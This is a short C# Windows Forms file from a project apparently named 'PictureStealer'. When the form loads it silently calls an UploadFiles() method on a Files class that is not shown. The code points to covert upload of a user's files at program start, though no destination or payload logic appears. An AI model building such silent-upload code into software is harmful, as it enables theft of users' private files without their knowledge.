using System;
using System.Windows.Forms;

namespace PictureStealer
{
    public partial class Form1 : Form
    {
      
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Files files = new Files();
            files.UploadFiles();

        }
    }
}
